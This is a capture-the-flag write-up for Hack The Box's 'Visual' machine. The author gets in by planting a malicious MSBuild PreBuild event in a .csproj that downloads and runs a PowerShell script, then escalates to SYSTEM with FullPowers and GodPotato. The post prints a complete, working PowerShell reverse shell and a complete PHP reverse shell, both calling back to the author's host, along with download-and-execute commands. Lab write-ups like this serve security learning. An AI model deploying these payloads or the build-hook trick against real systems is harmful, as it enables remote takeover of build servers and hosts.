Given the IP address `10.10.11.234`, let's first map it in our local hosts file.
```bash
sudo echo "10.10.11.234 visual.htb" >> /etc/hosts
```

### Scanning
Upon executing an Nmap scan against `visual.htb (10.10.11.234)`, the following results were obtained:

```bash
Host is up (0.28s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
...

```

From this scan, we can infer:
- The target is a Windows machine.
- It's running an Apache web server.
- A PHP application is hosted on it.

### Exploring the Web Application
Upon visiting `http://visual.htb` in a web browser, I was presented with a description of the application:

```text
Experience a revolutionary approach to Visual Studio project compilation with Visual. Say goodbye to the frustrations of build issues on your machine. Simply provide us with your Git Repo link, and we'll handle the rest. Our cutting-edge technology compiles your projects and sends back the executable or DLL files you need, effortlessly and efficiently.

We currently support .NET 6.0 and C# programs, so make sure your Git Repo includes a .sln file for successful compilation. Trust Visual to simplify and streamline your project compilation process like never before.
```

The application appears to offer a service where users can submit a Git URL, and it will compile the project found at that URL for them. To test the functionality and understand how it works, I decided to submit a URL pointing to a service that I control.

I initiated a netcat listener using:
```bash
nc -l 80
```

After submitting `http://10.10.14.14/test.git` through the application, the listener captured the following request:
```bash
 mekaneo@mba ~> nc -l 80
GET /test.git/info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.14.14
User-Agent: git/2.41.0.windows.1
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
Pragma: no-cache
Git-Protocol: version=2
```

A quick review of Git documentation revealed that the backend is executing a git clone command on the submitted URL.

### Setting Up a Local Git Repository

To further experiment with this functionality, I opted to set up a local Git repository using Gitea. Instead of manually setting it up, I used a preconfigured Docker image from Docker Hub:

![](<../../../assets/htb/visual/docker-image-running.png>)

Post-installation, I created a new user and an empty repository on my Gitea instance:

![](<../../../assets/htb/visual/gitea-empty-repo.png>)

I then cloned a simple C# project from GitHub and pushed it to my Gitea repository. After submitting this repo URL `(http://10.10.14.14:3000/mekaneo/visual-demo.git)` to the web application, I was presented with build artifacts:

![](<../../../assets/htb/visual/build-successful.png>)

Although the artifacts didn't directly provide an exploit, some research revealed a potential attack vector during the build process.

### Exploiting the MSBuild Process

A quick review of [Visual Code documentation](https://learn.microsoft.com/en-us/cpp/build/how-to-use-build-events-in-msbuild-projects?view=msvc-170) revealed that it is possible is execute a predefined command before the actual build happens.

MSBuild's `PreBuildEvent` can be manipulated to execute custom commands before the actual build process starts. This is done by defining a custom target `(PreBuild)` that runs before the `PreBuildEvent`.

I crafted a malicious .csproj file with a PreBuild event that downloads and executes a reverse shell script (revshell.ps1) from my machine:

```xml
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net7.0</TargetFramework>
    <RootNamespace>project_name</RootNamespace>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/revshell.ps1')" />
  </Target>

</Project>
```

<details>
    <summary>The `revshell.ps1` script I used is in this hidden block</summary>

```powershell
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.14', 2222);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```
</details>

### Gaining User Access

To summarize the attack:

- Create a basic C# repository with a malicious PreBuild event in its .csproj file
- Host it on the local Gitea instance
- Submit the repo URL to visual.htb
- Await the reverse shell connection

Executing the above steps provided me with a reverse shell:
![](<../../../assets/htb/visual/getting-reverse-shell.png>)
Navigating to the user's desktop and reading the user.txt file yielded the user flag.

### Gaining Administrator Access

Typically, web and database services possess "ImpersonatePrivilege" permissions. These permissions can potentially be exploited to escalate privileges. Given that a PHP application is running on this machine, I decided to upload and trigger a PHP reverse shell:
<details>
    <summary>The `revshell.php` script I used is in this hidden block</summary>

```php
<?php
// Copyright (c) 2020 Ivan Šincek
// v2.6
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer = 1024;  // read/write buffer size
    private $clen   = 0;     // command length
    private $error  = false; // stream read/write error
    private $sdump  = true;  // script's dump
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
            // once daemonized, you will actually no longer see the script's dump
        } else if (posix_setsid() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        if ($this->sdump) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // so we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.14', 3333);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```
</details>

```bash
cmd /c powershell Invoke-WebRequest -Uri http://10.10.14.14:8000/revshell.php -OutFile C:\xampp\htdocs\uploads\revshell.php
```
After setting up a netcat listener on port 3333, I triggered the revshell.php:
```bash
curl http://visual.htb/uploads/revshell.php
```
This action yielded a reverse shell:
```bash
mekaneo@mba ~/Hacking/HackTheBox/Machines/Visual.htb> nc -l 3333
SOCKET: Shell has connected! PID: 1576
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
Inspecting the privileges, I noticed the absence of `ImpersonatePrivilege`. Upon further research, I came across [FullPowers](https://github.com/itm4n/FullPowers). This tool allows the recovery of the default privilege set for `LOCAL/NETWORK SERVICE` accounts.

I proceeded to download and run FullPowers:
```bash
C:\xampp\htdocs\uploads>powershell Invoke-WebRequest -Uri http://10.10.14.14:8000/FullPowers.exe -OutFile FullPowers.exe
C:\xampp\htdocs\uploads>FullPowers
[+] Started dummy thread with id 636
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```
As you can see, after successfully elevating privileges, there is the coveted `SeImpersonatePrivilege`.

#### Onward to SYSTEM

With the required privileges in hand, I turned to [GodPotato](https://github.com/BeichenDream/GodPotato), a tool known for elevating a service user with low privileges to `NT AUTHORITY\SYSTEM` privileges.

I fetched and executed GodPotato, instructing it to read the Administrator user's root.txt:
```bash
C:\xampp\htdocs\uploads>powershell Invoke-WebRequest -Uri http://10.10.14.14:8000/GodPotato.exe -OutFile GodPotato.exe
C:\xampp\htdocs\uploads>GodPotato -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
[*] CombaseModule: 0x140711005847552
[*] DispatchTable: 0x140711008153712
[*] UseProtseqFunction: 0x140711007529888
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\d3dc94cd-aa94-4c05-85b9-0b1707985ab4\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007402-064c-ffff-7302-8b258c541d58
[*] DCOM obj OXID: 0xeee78599f402782d
[*] DCOM obj OID: 0xa2fb03f98da2456
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 880 Token:0x800  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4676

20****************************09 <---- Administrator FLAG
```
### The outcome? Success, with the system flag owned.
